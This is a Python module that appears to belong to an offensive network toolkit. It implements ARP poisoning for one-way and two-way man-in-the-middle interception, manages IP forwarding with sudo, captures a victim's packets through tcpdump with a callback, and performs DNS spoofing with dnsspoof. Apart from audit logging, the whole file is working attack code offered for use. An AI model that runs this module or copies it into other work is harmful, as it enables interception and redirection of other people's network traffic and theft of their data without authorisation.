"""ARP Spoofer / MITM module — ARP poisoning for traffic interception."""

from __future__ import annotations

import subprocess
import threading
import time
from typing import Optional, Callable

from core.logger import get_logger, get_audit_logger

log = get_logger("arp_spoofer")


class ArpSpoofer:
    """ARP spoofing for Man-in-the-Middle attacks.

    Uses arpspoof (from dsniff suite) or scapy for ARP cache poisoning.
    Supports:
      - One-way and two-way (full MITM) spoofing
      - IP forwarding management
      - Packet capture integration
      - Automatic cleanup on stop
    """

    def __init__(self) -> None:
        self._processes: list[subprocess.Popen] = []
        self._running = threading.Event()
        self._thread: Optional[threading.Thread] = None
        self._forwarding_was_enabled = False
        self._target_ip: str = ""
        self._gateway_ip: str = ""
        self._interface: str = ""
        self._on_packet: Optional[Callable] = None
        self._capture_process: Optional[subprocess.Popen] = None

    @property
    def is_running(self) -> bool:
        return self._running.is_set()

    def start(self, interface: str, target_ip: str, gateway_ip: str,
              two_way: bool = True, capture: bool = False,
              on_packet: Optional[Callable] = None) -> bool:
        """Start ARP spoofing.

        Args:
            interface: Network interface (e.g., eth0, wlan0)
            target_ip: Victim IP address
            gateway_ip: Gateway/router IP address
            two_way: Full MITM (spoof both target and gateway)
            capture: Enable packet capture with tcpdump
            on_packet: Callback for captured packet lines
        """
        if self._running.is_set():
            log.warning("ARP spoofer already running")
            return False

        audit = get_audit_logger()
        if audit:
            audit.log_action("arp_spoof_start", target_ip,
                             f"gateway={gateway_ip}, iface={interface}, two_way={two_way}")

        self._target_ip = target_ip
        self._gateway_ip = gateway_ip
        self._interface = interface
        self._on_packet = on_packet

        try:
            # Save current IP forwarding state and enable it
            self._forwarding_was_enabled = self._get_ip_forwarding()
            if not self._forwarding_was_enabled:
                self._set_ip_forwarding(True)
                log.info("Enabled IP forwarding")

            # Start arpspoof: target -> attacker (pretend to be gateway)
            cmd1 = ["sudo", "arpspoof", "-i", interface, "-t", target_ip, gateway_ip]
            p1 = subprocess.Popen(cmd1, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self._processes.append(p1)
            log.info(f"ARP spoofing: {target_ip} <- attacker as {gateway_ip}")

            if two_way:
                # gateway -> attacker (pretend to be target)
                cmd2 = ["sudo", "arpspoof", "-i", interface, "-t", gateway_ip, target_ip]
                p2 = subprocess.Popen(cmd2, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                self._processes.append(p2)
                log.info(f"ARP spoofing: {gateway_ip} <- attacker as {target_ip}")

            # Optional packet capture
            if capture:
                self._start_capture(interface, target_ip)

            self._running.set()
            log.info(f"MITM active: {target_ip} <-> {gateway_ip} via {interface}")
            return True

        except FileNotFoundError:
            log.error("arpspoof not found — install dsniff package")
            self.stop()
            return False
        except Exception as e:
            log.error(f"ARP spoof start failed: {e}")
            self.stop()
            return False

    def stop(self) -> None:
        """Stop ARP spoofing and restore ARP tables."""
        if not self._running.is_set() and not self._processes:
            return

        self._running.clear()

        audit = get_audit_logger()
        if audit:
            audit.log_action("arp_spoof_stop", self._target_ip)

        # Stop capture
        if self._capture_process and self._capture_process.poll() is None:
            self._capture_process.terminate()
            try:
                self._capture_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self._capture_process.kill()
            self._capture_process = None

        # Stop arpspoof processes
        for proc in self._processes:
            if proc.poll() is None:
                proc.terminate()
                try:
                    proc.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    proc.kill()
        self._processes.clear()

        # Restore IP forwarding
        if not self._forwarding_was_enabled:
            self._set_ip_forwarding(False)
            log.info("Restored IP forwarding to disabled")

        log.info("ARP spoofing stopped")

    def _start_capture(self, interface: str, target_ip: str) -> None:
        """Start tcpdump capture for the target."""
        try:
            cmd = [
                "sudo", "tcpdump", "-i", interface,
                "-l",  # line-buffered
                f"host {target_ip}",
                "-n",  # no DNS resolution
                "-q",  # quiet output
            ]
            self._capture_process = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
                text=True, bufsize=1,
            )
            # Read captured packets in background thread
            self._thread = threading.Thread(
                target=self._read_capture, daemon=True
            )
            self._thread.start()
        except Exception as e:
            log.error(f"Packet capture start failed: {e}")

    def _read_capture(self) -> None:
        """Read tcpdump output and forward to callback."""
        if not self._capture_process or not self._capture_process.stdout:
            return
        try:
            for line in self._capture_process.stdout:
                if not self._running.is_set():
                    break
                line = line.strip()
                if line and self._on_packet:
                    self._on_packet(line)
        except Exception:
            pass

    @staticmethod
    def _get_ip_forwarding() -> bool:
        """Check if IP forwarding is enabled."""
        try:
            result = subprocess.run(
                ["cat", "/proc/sys/net/ipv4/ip_forward"],
                capture_output=True, text=True, timeout=5,
            )
            return result.stdout.strip() == "1"
        except Exception:
            return False

    @staticmethod
    def _set_ip_forwarding(enable: bool) -> None:
        """Enable or disable IP forwarding."""
        val = "1" if enable else "0"
        try:
            subprocess.run(
                ["sudo", "sysctl", "-w", f"net.ipv4.ip_forward={val}"],
                capture_output=True, timeout=5,
            )
        except Exception as e:
            log.error(f"Failed to set IP forwarding: {e}")

    def dns_spoof(self, domain: str, redirect_ip: str) -> bool:
        """Add DNS spoofing rule (requires dnsspoof or ettercap).

        Redirects DNS queries for domain to redirect_ip.
        Only works when MITM is active.
        """
        if not self._running.is_set():
            log.error("MITM must be active for DNS spoofing")
            return False

        audit = get_audit_logger()
        if audit:
            audit.log_action("dns_spoof", domain, f"redirect={redirect_ip}")

        try:
            # Write hosts file for dnsspoof
            import tempfile
            hosts_file = tempfile.NamedTemporaryFile(
                mode="w", suffix=".hosts", delete=False, prefix="holocaust_dns_"
            )
            hosts_file.write(f"{redirect_ip}\t{domain}\n")
            hosts_file.close()

            cmd = [
                "sudo", "dnsspoof", "-i", self._interface,
                "-f", hosts_file.name,
            ]
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self._processes.append(proc)
            log.info(f"DNS spoofing: {domain} -> {redirect_ip}")
            return True

        except FileNotFoundError:
            log.error("dnsspoof not found — install dsniff package")
            return False
        except Exception as e:
            log.error(f"DNS spoof failed: {e}")
            return False

    def __del__(self) -> None:
        self.stop()
